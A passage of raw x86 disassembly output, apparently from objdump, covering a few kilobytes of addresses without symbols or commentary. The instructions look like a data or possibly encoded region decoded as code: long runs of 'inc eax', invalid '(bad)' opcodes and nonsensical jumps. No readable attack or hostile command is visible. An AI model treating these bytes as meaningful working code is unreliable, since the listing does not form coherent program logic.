  403d32:	inc    eax
  403d33:	inc    eax
  403d34:	inc    eax
  403d35:	inc    eax
  403d36:	inc    eax
  403d37:	inc    eax
  403d38:	loopne 0x403d74
  403d3a:	pusha  
  403d3b:	das    
  403d3c:	dec    eax
  403d3d:	(bad)  
  403d3e:	jb     0x403da2
  403d40:	jns    0x403d82
  403d42:	inc    eax
  403d43:	mov    eax,0x9ae4941
  403d48:	xlat   BYTE PTR ds:[ebx]
  403d49:	sub    DWORD PTR ds:0x52404446,esp
  403d4f:	enter  0xdb79,0x40
  403d53:	cmp    BYTE PTR [eax],ch
  403d55:	jmp    0x4040:0x4040409e
  403d5c:	inc    eax
  403d5d:	int3   
  403d5e:	jne    0x403da0
  403d60:	pusha  
  403d61:	rol    cl,1
  403d63:	sub    BYTE PTR [edx-0x23],ah
  403d66:	sub    BYTE PTR [eax+0x2],al
  403d69:	jns    0x403dbc
  403d6b:	pusha  
  403d6c:	scas   al,BYTE PTR es:[edi]
  403d6d:	cmp    al,0x3d
  403d6f:	push   0xf64bc7c9
  403d74:	test   al,0x91
  403d76:	stos   DWORD PTR es:[edi],eax
  403d77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d78:	mov    esp,0x5060c579
  403d7d:	fiadd  DWORD PTR [eax+0x0]
  403d80:	rol    DWORD PTR [eax+0x40],0x40
  403d84:	inc    eax
  403d85:	add    BYTE PTR [eax+0x42],al
  403d88:	pusha  
  403d89:	add    eax,0x2a500ac1
  403d8e:	bound  esi,QWORD PTR ds:0xc17942d9
  403d94:	push   ecx
  403d95:	inc    edx
  403d96:	inc    eax
  403d97:	adc    BYTE PTR [ebp+0x43],0x30
  403d9b:	iret   
  403d9c:	inc    ecx
  403d9d:	or     al,0x1
  403d9f:	lds    edi,FWORD PTR [eax-0x5e3886d8]
  403da5:	in     al,dx
  403da6:	enter  0x6d42,0x5c
  403daa:	inc    eax
  403dab:	inc    eax
  403dac:	inc    eax
  403dad:	inc    eax
  403dae:	inc    eax
  403daf:	inc    eax
  403db0:	inc    eax
  403db1:	inc    eax
  403db2:	inc    DWORD PTR [eax+0x23]
  403db5:	or     dh,BYTE PTR [ecx-0x28]
  403db8:	nop
  403db9:	(bad)  
  403dba:	xchg   ecx,eax
  403dbb:	or     BYTE PTR [ecx-0x39],bh
  403dbe:	push   ebx
  403dbf:	test   al,0x4d
  403dc1:	dec    edi
  403dc2:	arpl   cx,cx
  403dc4:	add    cl,BYTE PTR [ecx-0x2f]
  403dc7:	js     0x403d94
  403dc9:	mov    al,0x57
  403dcb:	mov    eax,0x2e48ce79
  403dd0:	ss adc eax,0x326f0d6f
  403dd6:	icebp  
  403dd7:	ds inc esp
  403dd9:	inc    eax
  403dda:	inc    eax
  403ddb:	inc    eax
  403ddc:	inc    eax
  403ddd:	inc    eax
  403dde:	inc    eax
  403ddf:	inc    eax
  403de0:	inc    eax
  403de1:	inc    eax
  403de2:	inc    eax
  403de3:	dec    eax
  403de4:	xchg   ebp,eax
  403de5:	inc    edx
  403de6:	jns    0x403deb
  403de8:	and    edi,DWORD PTR [eax+0x5]
  403deb:	int3   
  403dec:	arpl   WORD PTR [ebp+0x5c],bp
  403def:	iret   
  403df0:	pop    eax
  403df1:	bound  ebp,QWORD PTR [esp+eiz*8]
  403df4:	sub    eax,0x2d747928
  403df9:	cmp    eax,0x80604563
  403dfe:	push   edx
  403dff:	(bad)  
  403e00:	and    al,0x34
  403e02:	dec    eax
  403e03:	xor    eax,0x40401562
  403e08:	inc    eax
  403e09:	inc    eax
  403e0a:	inc    eax
  403e0b:	inc    eax
  403e0c:	inc    eax
  403e0d:	inc    eax
  403e0e:	add    BYTE PTR [ecx-0x45],bh
  403e11:	jae    0x403e76
  403e13:	add    ch,BYTE PTR [ecx-0x40]
  403e16:	leave  
  403e17:	inc    ebp
  403e18:	outs   dx,DWORD PTR ds:[esi]
  403e19:	inc    edx
  403e1a:	inc    edi
  403e1b:	or     ebp,DWORD PTR [esi]
  403e1d:	dec    esp
  403e1e:	pusha  
  403e1f:	js     0x403e94
  403e21:	icebp  
  403e22:	inc    eax
  403e23:	push   0x40
  403e25:	inc    eax
  403e26:	inc    eax
  403e27:	inc    eax
  403e28:	inc    eax
  403e29:	inc    eax
  403e2a:	and    eax,0x62404040
  403e2f:	cmp    DWORD PTR [ecx-0x55],eax
  403e32:	les    ecx,FWORD PTR [ebx+0x7bdc6251]
  403e38:	and    bh,BYTE PTR [eax+0x6f]
  403e3b:	xchg   esi,eax
  403e3c:	push   ebx
  403e3d:	repz and al,0x16
  403e40:	rcr    BYTE PTR [ebx-0x3f9c4891],0xb0
  403e47:	loope  0x403dcd
  403e49:	js     0x403e0b
  403e4b:	inc    eax
  403e4c:	inc    eax
  403e4d:	inc    eax
  403e4e:	inc    eax
  403e4f:	inc    eax
  403e50:	inc    eax
  403e51:	inc    eax
  403e52:	inc    eax
  403e53:	inc    eax
  403e54:	inc    eax
  403e55:	or     eax,0x62156230
  403e5a:	add    eax,0x28137ffb
  403e5f:	inc    ebp
  403e60:	leave  
  403e61:	test   ecx,0x40f32878
  403e67:	or     BYTE PTR [edi+ecx*2+0x5c],0xf1
  403e6c:	shl    DWORD PTR [esi],0x2a
  403e6f:	daa    
  403e70:	inc    ecx
  403e71:	inc    eax
  403e72:	inc    eax
  403e73:	inc    eax
  403e74:	inc    eax
  403e75:	inc    eax
  403e76:	inc    eax
  403e77:	rol    DWORD PTR [eax+0x40],0x71
  403e7b:	inc    ecx
  403e7c:	js     0x403ec0
  403e7e:	mov    bl,0x42
  403e80:	fist   WORD PTR [edx+edi*1]
  403e83:	push   esp
  403e84:	in     al,0xc0
  403e86:	in     eax,0xda
  403e88:	test   al,0xd8
  403e8a:	(bad)  
  403e8b:	les    edi,FWORD PTR [eax+0x26]
  403e8e:	xor    BYTE PTR [eax],al
  403e90:	adc    esi,ebx
  403e92:	outs   dx,DWORD PTR ds:[esi]
  403e93:	push   eax
  403e94:	retf   
  403e95:	push   ss
  403e96:	das    
  403e97:	bound  eax,QWORD PTR [ecx-0x3c]
  403e9a:	inc    eax
  403e9b:	inc    eax
  403e9c:	add    BYTE PTR [eax+0x40],al
  403e9f:	inc    eax
  403ea0:	inc    eax
  403ea1:	inc    eax
  403ea2:	inc    eax
  403ea3:	mov    WORD PTR [eax],cs
  403ea5:	js     0x403eed
  403ea7:	inc    ebx
  403ea8:	fs inc ecx
  403eaa:	dec    edi
  403eab:	fs leave 
  403ead:	cmp    eax,ecx
  403eaf:	(bad)  
  403eb0:	cmc    
  403eb1:	and    BYTE PTR [eax-0x6d],al
  403eb4:	lods   al,BYTE PTR ds:[esi]
  403eb5:	js     0x403f33
  403eb7:	add    ebp,DWORD PTR [ecx+0x4040a44d]
  403ebd:	inc    eax
  403ebe:	inc    eax
  403ebf:	inc    eax
  403ec0:	inc    eax
  403ec1:	inc    eax
  403ec2:	inc    eax
  403ec3:	inc    eax
  403ec4:	inc    eax
  403ec5:	sub    al,0xd
  403ec7:	jle    0x403e89
  403ec9:	outs   dx,DWORD PTR ds:[esi]
  403eca:	push   edi
  403ecb:	retf   
  403ecc:	cmp    eax,0x3478cb65
  403ed1:	jns    0x403f21
  403ed3:	dec    esp
  403ed4:	ret    
  403ed5:	test   al,0x43
  403ed7:	jo     0x403f2a
  403ed9:	xor    eax,0x80a80224
  403ede:	jecxz  0x403f20
  403ee0:	ret    0xa041
  403ee3:	inc    ecx
  403ee4:	inc    ebp
  403ee5:	icebp  
  403ee6:	inc    eax
  403ee7:	inc    eax
  403ee8:	inc    eax
  403ee9:	inc    eax
  403eea:	inc    eax
  403eeb:	inc    eax
  403eec:	int3   
  403eed:	jne    0x403f2f
  403eef:	xor    al,0x40
  403ef1:	ss push eax
  403ef3:	gs inc ecx
  403ef5:	std    
  403ef6:	bound  eax,QWORD PTR [edx+0x40]
  403ef9:	inc    eax
  403efa:	js     0x403ea4
  403efc:	sub    al,dl
  403efe:	adc    eax,0x16601886
  403f03:	jo     0x403efd
  403f05:	test   al,0xcd
  403f07:	mov    esp,0x3500b40
  403f0c:	loope  0x403f4e
  403f0e:	add    cl,al
  403f10:	inc    eax
  403f11:	inc    eax
  403f12:	inc    eax
  403f13:	inc    eax
  403f14:	add    BYTE PTR [eax+0xd],al
  403f17:	adc    BYTE PTR ds:0x5270c040,dl
  403f1d:	imul   ecx,ebx,0x36
  403f20:	inc    ebx
  403f21:	lock xchg ecx,eax
  403f23:	daa    
  403f24:	adc    BYTE PTR [edx-0x44],al
  403f27:	jle    0x403ee1
  403f29:	inc    eax
  403f2a:	and    DWORD PTR [eax-0x3bbead54],esi
  403f30:	inc    ebx
  403f31:	inc    eax
  403f32:	dec    eax
  403f33:	inc    eax
  403f34:	inc    eax
  403f35:	inc    eax
  403f36:	inc    eax
  403f37:	inc    eax
  403f38:	inc    eax
  403f39:	inc    eax
  403f3a:	inc    eax
  403f3b:	inc    DWORD PTR [eax+0x6d]
  403f3e:	add    eax,0xb765f208
  403f43:	inc    eax
  403f44:	rol    BYTE PTR [edi+0x6b],0xc9
  403f48:	int3   
  403f49:	adc    BYTE PTR [eax],ah
  403f4b:	jg     0x403f7c
  403f4d:	nop
  403f4e:	aaa    
  403f4f:	inc    eax
  403f50:	cmp    DWORD PTR [ebx+0x62],0x40135335
  403f57:	inc    eax
  403f58:	inc    eax
  403f59:	inc    eax
  403f5a:	inc    eax
  403f5b:	inc    eax
  403f5c:	inc    eax
  403f5d:	inc    eax
  403f5e:	inc    eax
  403f5f:	inc    eax
  403f60:	arpl   WORD PTR [ecx],ax
  403f62:	sub    al,0xf9
  403f64:	leave  
  403f65:	jg     0x403f29
  403f67:	jmp    0x3042:0x42abc8ac
  403f6e:	and    eax,0xbcf4315c
  403f73:	mov    al,0x81
  403f75:	jg     0x403fb7
  403f77:	nop
  403f78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f79:	dec    ebp
  403f7a:	adc    eax,0xc04ac3f4
  403f7f:	pusha  
  403f80:	addr16 inc esp
  403f82:	out    dx,eax
  403f83:	inc    eax
  403f84:	inc    eax
  403f85:	inc    eax
  403f86:	inc    eax
  403f87:	inc    eax
  403f88:	inc    eax
  403f89:	inc    eax
  403f8a:	inc    eax
  403f8b:	add    BYTE PTR [eax+0x5e2340bc],ch
  403f91:	out    0x6c,eax
  403f93:	das    
  403f94:	addr16 inc edx
  403f96:	inc    eax
  403f97:	cmp    DWORD PTR [ecx],edx
  403f99:	fs push eax
  403f9b:	mov    al,ds:0x40404040
  403fa0:	inc    eax
  403fa1:	inc    eax
  403fa2:	and    eax,0x12404040
  403fa7:	sbb    DWORD PTR [eax-0x40],eax
  403faa:	stos   DWORD PTR es:[edi],eax
  403fab:	bound  esp,QWORD PTR [edx+0x41]
  403fae:	bound  edi,QWORD PTR [eax+0x45f31550]
  403fb4:	lods   al,BYTE PTR ds:[esi]
  403fb5:	mov    ecx,0x33406231
  403fba:	adc    eax,esi
  403fbc:	add    eax,0x40704380
  403fc1:	push   ecx
  403fc2:	ss mov bl,0xc9
  403fc5:	test   al,0xfd
  403fc7:	add    al,ah
  403fc9:	shl    BYTE PTR [eax],0xc8
  403fcc:	inc    edx
  403fcd:	inc    eax
  403fce:	inc    eax
  403fcf:	inc    eax
  403fd0:	inc    eax
  403fd1:	inc    eax
  403fd2:	inc    eax
  403fd3:	inc    eax
  403fd4:	inc    eax
  403fd5:	inc    eax
  403fd6:	inc    eax
  403fd7:	push   0x67
  403fd9:	retf   
  403fda:	inc    eax
  403fdb:	test   al,0xb5
  403fdd:	test   al,0xcf
  403fdf:	ret    0xbf1d
  403fe2:	inc    eax
  403fe3:	pusha  
  403fe4:	adc    ah,cl
  403fe6:	or     esp,DWORD PTR [edx+0x5c]
  403fe9:	inc    eax
  403fea:	inc    eax
  403feb:	inc    eax
  403fec:	inc    eax
  403fed:	inc    eax
  403fee:	inc    eax
  403fef:	rol    DWORD PTR [eax+0x40],0xbf
  403ff3:	inc    eax
  403ff4:	pop    ecx
  403ff5:	and    esp,edi
  403ff7:	push   0x728b639c
  403ffc:	inc    eax
  403ffd:	cli    
  403ffe:	bound  esp,QWORD PTR [edi+0x10]
  404001:	mov    edi,edx
  404003:	xchg   ebp,eax
  404004:	xor    ecx,DWORD PTR [eax-0x3c]
  404007:	inc    eax
  404008:	inc    eax
  404009:	add    BYTE PTR [eax+0x40],al
  40400c:	inc    eax
  40400d:	inc    eax
  40400e:	inc    eax
  40400f:	inc    eax
  404010:	push   ss
  404011:	xchg   ecx,eax
  404012:	test   al,0x44
  404014:	inc    eax
  404015:	push   eax
  404016:	adc    DWORD PTR [edi+0x62],ecx
  404019:	mov    ch,0x12
  40401b:	outs   dx,BYTE PTR ds:[esi]
  40401c:	inc    eax
  40401d:	shr    BYTE PTR [ebx+0x70],0x5c
  404021:	(bad)  
  404022:	lods   al,BYTE PTR ds:[esi]
  404023:	sub    BYTE PTR [eax+0x1],al
  404026:	inc    eax
  404027:	inc    eax
  404028:	inc    eax
  404029:	inc    eax
  40402a:	inc    eax
  40402b:	inc    eax
  40402c:	inc    eax
  40402d:	inc    eax
  40402e:	inc    eax
  40402f:	inc    eax
  404030:	adc    DWORD PTR [edx+0x30],ebp
  404033:	ins    BYTE PTR es:[edi],dx
  404034:	adc    eax,0x51034c62
  404039:	pop    ebx
  40403a:	mov    edx,ebp
  40403c:	inc    edx
  40403d:	inc    ebx
  40403e:	inc    eax
  40403f:	pop    edx
  404040:	jno    0x404047
  404042:	enter  0x6c62,0xa2
  404046:	inc    eax
  404047:	ret    0xc910
  40404a:	xor    ebx,ecx
  40404c:	sub    BYTE PTR [ecx-0x40ced330],dl
  404052:	dec    esp
  404053:	adc    eax,0x404045c6
  404058:	inc    eax
  404059:	inc    eax
  40405a:	inc    eax
  40405b:	inc    eax
  40405c:	int3   
  40405d:	jne    0x40409f
  40405f:	inc    eax
  404060:	inc    eax
  404061:	and    edi,DWORD PTR [esi-0x303a7630]
  404067:	inc    eax
  404068:	shl    BYTE PTR [ebx-0x50],0x90
  40406c:	jns    0x4040bd
  40406e:	adc    DWORD PTR [eax+0x34],eax
  404071:	xchg   ebp,eax
  404072:	dec    edx
  404073:	in     al,dx
  404074:	and    BYTE PTR [eax+eax*2+0x0],ch
  404078:	rol    DWORD PTR [eax+0x40],0x40
  40407c:	inc    eax
  40407d:	add    BYTE PTR [eax-0x6c],al
  404080:	jno    0x4040d8
  404082:	shr    BYTE PTR [eax+0x72c7a4a8],cl
  404088:	rol    al,0x22
  40408b:	inc    esp
  40408c:	inc    eax
  40408d:	inc    eax
  40408e:	inc    eax
  40408f:	inc    eax
  404090:	inc    eax
  404091:	inc    eax
  404092:	inc    eax
  404093:	inc    eax
  404094:	inc    DWORD PTR [eax+0x14]
  404097:	add    eax,0x7d719a62
  40409c:	inc    esi
  40409d:	sub    BYTE PTR [edi+0x3164ee87],dl
  4040a3:	inc    eax
  4040a4:	jae    0x4040ba
  4040a6:	bound  eax,QWORD PTR [eax-0x20]
  4040a9:	inc    eax
  4040aa:	inc    eax
  4040ab:	inc    eax
  4040ac:	inc    eax
  4040ad:	inc    eax
  4040ae:	inc    eax
  4040af:	inc    eax
  4040b0:	inc    eax
  4040b1:	inc    eax
  4040b2:	inc    eax
  4040b3:	jge    0x404126
  4040b5:	sar    BYTE PTR [ebp+0x52405662],0x4a
  4040bc:	add    al,0x15
  4040be:	push   edi
  4040bf:	test   al,0xd4
  4040c1:	inc    eax
  4040c2:	push   esi
  4040c3:	inc    esp
  4040c4:	jno    0x4040f9
  4040c6:	xor    DWORD PTR [ebp-0x74],eax
  4040c9:	mov    cl,0x38
  4040cb:	inc    eax
  4040cc:	inc    eax
  4040cd:	inc    eax
  4040ce:	inc    eax
  4040cf:	inc    eax
  4040d0:	inc    eax
  4040d1:	inc    eax
  4040d2:	inc    eax
  4040d3:	add    BYTE PTR [esi+0x344a1a72],al
  4040d9:	shr    BYTE PTR [ecx-0x3f8f4737],1
  4040df:	xor    DWORD PTR [eax-0x59],eax
  4040e2:	mov    edi,0x2c8715e2
  4040e7:	sub    BYTE PTR [eax-0x57],al
  4040ea:	mov    BYTE PTR [ecx+0x535e7043],dl
  4040f0:	add    bh,BYTE PTR [eax-0x7eb213d]
  4040f6:	rol    BYTE PTR [eax+0x40],0x40
  4040fa:	inc    eax
  4040fb:	inc    eax
  4040fc:	inc    eax
  4040fd:	and    eax,0x3f404040
  404102:	push   ebx
  404103:	jecxz  0x40414d
  404105:	bound  ebp,QWORD PTR [eax+esi*2]
  404108:	pusha  
  404109:	xchg   ebx,eax
  40410a:	mov    eax,0x6ef735e7
  40410f:	cmp    BYTE PTR [ebx+0x53],ch
  404112:	jge    0x404193
  404114:	inc    eax
  404115:	dec    edi
  404116:	les    esi,FWORD PTR [eax-0x40]
  404119:	push   ecx
  40411a:	ret    
  40411b:	xor    al,0x4c
  40411d:	adc    ah,BYTE PTR [edx+0x2c]
  404120:	cs inc edx
  404122:	inc    edi
  404123:	fs dec esp
  404125:	lods   al,BYTE PTR ds:[esi]
  404126:	stc    
  404127:	inc    eax
  404128:	inc    eax
  404129:	inc    eax
  40412a:	inc    eax
  40412b:	inc    eax
  40412c:	inc    eax
  40412d:	inc    eax
  40412e:	inc    eax
  40412f:	inc    eax
  404130:	inc    eax
  404131:	jo     0x40418a
  404133:	fucom  st(1)
  404135:	add    ebp,DWORD PTR [esi+0x41]
  404138:	dec    edx
  404139:	pop    edi
  40413a:	rcr    BYTE PTR [ecx-0x80],0x40
  40413e:	pusha  
  40413f:	lea    eax,[eax+eax*2+0x15]
  404143:	pop    eax
  404144:	bound  eax,QWORD PTR [edx+eiz*2-0x34]
  404148:	enter  0x4040,0x40
  40414c:	inc    eax
  40414d:	inc    eax
  40414e:	inc    eax
  40414f:	rol    DWORD PTR [eax+0x40],0x40
  404153:	es das 
  404155:	loope  0x4041a7
  404157:	and    BYTE PTR [edi+edi*4+0x40],0x42
  40415c:	mov    esi,0x1524e564
  404161:	inc    esi
  404162:	pop    esp
  404163:	shl    BYTE PTR [ebx+eiz*2],0xbc
  404167:	fs xchg esp,eax
  404169:	add    al,0x40
  40416b:	jle    0x404141
  40416d:	mov    esi,0x4040aced
  404172:	add    BYTE PTR [eax+0x40],al
  404175:	inc    eax
  404176:	inc    eax
  404177:	inc    eax
  404178:	inc    eax
  404179:	adc    ecx,edx
  40417b:	inc    eax
  40417c:	pop    ebp
  40417d:	add    ecx,edi
  40417f:	xor    bl,al
  404181:	pushf  
  404182:	mov    al,0xc0
  404184:	rol    BYTE PTR [ebp+0x5],0x6b
  404188:	inc    ecx
  404189:	mov    esp,0x127c4035
  40418e:	test   al,0x90
  404190:	inc    DWORD PTR ds:0x7f407fcb
  404196:	push   esp
  404197:	(bad)  
  404198:	jp     0x404163
  40419a:	mov    eax,0xac09c3a0
  40419f:	fld    QWORD PTR [eax+0x40]
  4041a2:	inc    eax
  4041a3:	inc    eax
  4041a4:	inc    eax
  4041a5:	inc    eax
  4041a6:	inc    eax
  4041a7:	inc    eax
  4041a8:	inc    eax
  4041a9:	inc    eax
  4041aa:	test   al,0x26
  4041ac:	adc    eax,0xc3b1597f
  4041b1:	ror    BYTE PTR [ebp+0x41],0xcb
  4041b5:	aam    0xc0
  4041b7:	push   ecx
  4041b8:	inc    esp
  4041b9:	retf   
  4041ba:	popf   
  4041bb:	adc    DWORD PTR [eax+0x7f],eax
  4041be:	dec    edx
  4041bf:	push   ecx
  4041c0:	cs mov edi,0xcc8a443a
  4041c6:	push   ss
  4041c7:	(bad)  
  4041c8:	mov    esp,0x40404dbe
  4041cd:	inc    eax
  4041ce:	inc    eax
  4041cf:	inc    eax
  4041d0:	inc    eax
  4041d1:	int3   
  4041d2:	jne    0x404214
  4041d4:	bound  ebp,QWORD PTR [ebx]
  4041d6:	jg     0x404218
  4041d8:	adc    DWORD PTR [ebp+edi*4-0x43],esp
  4041dc:	clc    
  4041dd:	inc    eax
  4041de:	(bad)  
  4041df:	dec    ebp
  4041e0:	lock cmp ebp,DWORD PTR [eax+0x784f4121]
  4041e7:	inc    eax
  4041e8:	sti    
  4041e9:	inc    eax
  4041ea:	add    cl,al
  4041ec:	inc    eax
  4041ed:	inc    eax
  4041ee:	inc    eax
  4041ef:	inc    eax
  4041f0:	add    BYTE PTR [eax-0x10],al
  4041f3:	test   al,0x41
  4041f5:	cmc    
  4041f6:	cwde   
  4041f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041f8:	jle    0x4041e9
  4041fa:	mov    cl,0x12
  4041fc:	std    
  4041fd:	push   edx
  4041fe:	inc    esp
  4041ff:	js     0x404241
  404201:	test   eax,0xc44945d8
  404206:	bound  esp,QWORD PTR [eax+0x78653562]
  40420c:	pusha  
  40420d:	dec    edi
  40420e:	inc    esp
  40420f:	js     0x404251
  404211:	push   esp
  404212:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404213:	inc    eax
  404214:	inc    eax
  404215:	inc    eax
  404216:	inc    eax
  404217:	inc    eax
  404218:	inc    eax
  404219:	inc    eax
  40421a:	inc    eax
  40421b:	inc    DWORD PTR [eax-0x38]
  40421e:	stos   BYTE PTR es:[edi],al
  40421f:	inc    eax
  404220:	inc    ebp
  404221:	pushf  
  404222:	jnp    0x404218
  404224:	adc    BYTE PTR [edx+0x4d],ah
  404227:	dec    esp
  404228:	cmp    eax,0x63304078
  40422d:	loopne 0x4041cc
  40422f:	inc    ecx
  404230:	ds cwde 
  404232:	inc    ebx
  404233:	inc    eax
  404234:	inc    ecx
  404235:	or     eax,0x4040403a
  40423a:	inc    eax
  40423b:	inc    eax
  40423c:	inc    eax
  40423d:	inc    eax
  40423e:	inc    eax
  40423f:	inc    eax
  404240:	inc    eax
  404241:	inc    ecx
  404242:	xchg   esi,eax
  404243:	js     0x40428b
  404245:	xor    DWORD PTR [eax],esi
  404247:	retf   
  404248:	dec    ebp
  404249:	hlt    
  40424a:	imul   edx,DWORD PTR [ecx+eax*1-0x4210bcb1],0x56
  404252:	push   edx
  404253:	js     0x404295
  404255:	push   ecx
  404256:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404257:	and    esp,DWORD PTR [ecx]
  404259:	inc    eax
  40425a:	inc    eax
  40425b:	inc    eax
  40425c:	inc    eax
  40425d:	inc    eax
  40425e:	inc    eax
  40425f:	inc    eax
  404260:	inc    eax
  404261:	add    BYTE PTR [edi+0x62],bl
  404264:	nop
  404265:	add    bl,BYTE PTR [edi+0x2c4d4445]
  40426b:	inc    ebx
  40426c:	js     0x404241
  40426e:	xchg   edx,eax
  40426f:	test   al,0xdd
  404272:	jno    0x4042b4
  404274:	inc    eax
  404275:	inc    eax
  404276:	inc    eax
  404277:	inc    eax
  404278:	inc    eax
  404279:	and    eax,0x2c404040
  40427e:	mov    WORD PTR [ecx+0x17],es
  404281:	dec    eax
  404282:	inc    ecx
  404283:	inc    edi
  404284:	lock jecxz 0x4042ff
  404287:	push   ecx
  404288:	mov    esi,0x52fccc41
  40428d:	(bad)
  404291:	cmp    eax,0x40404040
  404296:	inc    eax
  404297:	inc    eax
  404298:	inc    eax
  404299:	inc    eax
  40429a:	inc    eax
  40429b:	inc    eax
  40429c:	sub    al,BYTE PTR [eax-0x57]
  40429f:	inc    ebp
  4042a0:	ja     0x404321
  4042a2:	mov    edi,0x5cb4a179
  4042a7:	data16 mov ah,0x42
  4042aa:	inc    eax
  4042ab:	test   BYTE PTR [eax+0x77c9296e],ch
  4042b1:	and    eax,DWORD PTR [eax-0x58]
  4042b4:	inc    ebp
  4042b5:	retf   
  4042b6:	pop    esp
  4042b7:	pop    esp
  4042b8:	mov    al,0xce
  4042ba:	dec    esi
  4042bb:	inc    eax
  4042bc:	inc    eax
  4042bd:	inc    eax
  4042be:	inc    eax
  4042bf:	inc    eax
  4042c0:	inc    eax
  4042c1:	rol    DWORD PTR [eax+0x40],0x40
  4042c5:	aas    
  4042c6:	es int3 
  4042c8:	in     eax,dx
  4042c9:	ja     0x4042d6
  4042cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042cc:	sub    al,BYTE PTR [eax+ecx*2+0x67]
  4042d0:	mov    edi,0x102c54ac
  4042d5:	dec    ebx
  4042d6:	add    eax,0x40404d
  4042db:	inc    eax
  4042dc:	inc    eax
  4042dd:	inc    eax
  4042de:	inc    eax
  4042df:	inc    eax
  4042e0:	inc    eax
  4042e1:	test   al,0x77
  4042e3:	jne    0x404307
  4042e5:	inc    eax
  4042e6:	sub    eax,0xa810fcc9
  4042eb:	shr    eax,cl
  4042ed:	add    cl,BYTE PTR [eax]
  4042ef:	es addr16 inc edx
  4042f2:	ja     0x40433d
  4042f4:	inc    eax
  4042f5:	push   ecx
  4042f6:	inc    eax
  4042f7:	inc    eax
  4042f8:	inc    eax
  4042f9:	inc    eax
  4042fa:	inc    eax
  4042fb:	inc    eax
  4042fc:	inc    eax
  4042fd:	inc    eax
  4042fe:	inc    eax
  4042ff:	inc    eax
  404300:	frstor [eax+0x5c]
  404303:	and    BYTE PTR [edi+eiz*2-0x7f8b53b9],0xac
  40430b:	ret    
  40430c:	ja     0x40435d
  40430e:	push   eax
  40430f:	loope  0x40431b
  404311:	ret    
  404312:	ret    
  404313:	mov    esp,0x40403ba0
  404318:	inc    eax
  404319:	inc    eax
  40431a:	inc    eax
  40431b:	inc    eax
  40431c:	int3   
  40431d:	jne    0x40435f
  40431f:	sbb    eax,0x37466248
  404324:	inc    esp
  404325:	ja     0x404368
  404327:	aad    0x67
  404329:	retf   
  40432a:	inc    ebx
  40432b:	jmp    DWORD PTR [eax]
  40432d:	pushf  
  40432e:	dec    ecx
  40432f:	inc    ecx
  404330:	rcr    bl,1
  404332:	xor    al,0x8f
  404334:	int3   
  404335:	jae    0x404377
  404337:	pop    eax
  404338:	jge    0x40436b
  40433a:	dec    ebx
  40433b:	nop
  40433c:	mov    ebx,DWORD PTR [ecx+0x50f4392f]
  404342:	aas    
  404343:	xchg   ecx,eax
  404344:	inc    esi
  404345:	inc    eax
  404346:	add    cl,al
  404348:	inc    eax
  404349:	inc    eax
  40434a:	inc    eax
  40434b:	inc    eax
  40434c:	add    BYTE PTR [eax+0x73],al
  40434f:	dec    ebx
  404350:	push   ebx
  404351:	test   al,0xdc
  404353:	sbb    bh,BYTE PTR [edi+0x5140923d]
  404359:	inc    eax
  40435a:	push   ebx
  40435b:	mov    edx,0xfd735477
  404360:	gs inc eax
  404362:	mov    al,ds:0x664d0ec3
  404367:	jp     0x4043dc
  404369:	inc    ebx
  40436a:	jg     0x4043b4
  40436c:	bound  esi,QWORD PTR ds:0x40414d73
  404372:	inc    eax
  404373:	inc    eax
  404374:	inc    eax
  404375:	inc    eax
  404376:	inc    eax
  404377:	inc    eax
  404378:	inc    eax
  404379:	inc    DWORD PTR [eax-0x58]
  40437c:	je     0x404393
  40437e:	dec    eax
  40437f:	dec    ebx
  404380:	push   esp
  404381:	inc    eax
  404382:	shr    DWORD PTR [eax],cl
  404384:	push   edx
  404385:	neg    eax
  404387:	ss jb  0x4043b6
  40438a:	push   ebx
  40438b:	push   0xffffffd6
  40438d:	dec    edi
  40438e:	push   edx
  40438f:	test   al,0x0
  404391:	inc    eax
  404392:	jno    0x4043c9
  404394:	ins    BYTE PTR es:[edi],dx
  404395:	push   esp
  404396:	push   0x12
  404398:	jno    0x4043d3
  40439a:	scas   eax,DWORD PTR es:[edi]
  40439b:	inc    eax
  40439c:	inc    eax
  40439d:	inc    eax
  40439e:	inc    eax
  40439f:	inc    eax
  4043a0:	inc    eax
  4043a1:	inc    eax
  4043a2:	inc    eax
  4043a3:	inc    eax
  4043a4:	inc    eax
  4043a5:	and    BYTE PTR [ebx+0x3c],0xf9
  4043a9:	pop    esp
  4043aa:	fisub  WORD PTR [edi]
  4043ac:	inc    esp
  4043ad:	lds    ebp,FWORD PTR [ebp+0x40116301]
  4043b3:	inc    eax
  4043b4:	inc    eax
  4043b5:	inc    eax
  4043b6:	inc    eax
  4043b7:	inc    eax
  4043b8:	inc    eax
  4043b9:	inc    eax
  4043ba:	add    BYTE PTR [ecx+0x40],dh
  4043bd:	ror    DWORD PTR [ecx-0x32],1
  4043c0:	dec    ecx
  4043c1:	test   eax,0x1633cccb
  4043c6:	inc    edx
  4043c7:	leave  
  4043c8:	inc    esi
  4043c9:	fmul   QWORD PTR [eax+0x71]
  4043cc:	inc    eax
  4043cd:	inc    eax
  4043ce:	inc    eax
  4043cf:	inc    eax
  4043d0:	inc    eax
  4043d1:	inc    eax
  4043d2:	and    eax,0x40404040
  4043d7:	xor    esp,edx
  4043d9:	icebp  
  4043da:	sub    BYTE PTR [ecx+0x45],ah
  4043dd:	push   esi
  4043de:	add    al,0x41
  4043e0:	mov    ch,0x8
  4043e2:	imul   DWORD PTR [eax]
  4043e4:	ds jo  0x404454
  4043e7:	jbe    0x40436e
  4043e9:	bound  ecx,QWORD PTR [edi+0x64]
  4043ec:	xor    al,0xb6
  4043ee:	inc    ebp
  4043ef:	inc    ecx
  4043f0:	inc    edx
  4043f1:	jnp    0x404454
  4043f3:	das    
  4043f4:	or     DWORD PTR [eax+0x40],eax
  4043f7:	jg     0x4043ef
  4043f9:	cld    
  4043fa:	rol    BYTE PTR [eax+0x40],1
  4043fd:	inc    eax
  4043fe:	inc    eax
  4043ff:	inc    eax
  404400:	inc    eax
  404401:	inc    eax
  404402:	inc    eax
  404403:	inc    eax
  404404:	inc    eax
  404405:	and    al,bl
  404407:	inc    eax
  404408:	and    eax,0xcf627b7d
  40440d:	bound  ebp,QWORD PTR [edx+0x40]
  404410:	pop    ebx
  404411:	push   DWORD PTR [ecx+edx*1]
  404414:	cmp    BYTE PTR [edi+0x50400058],0x40
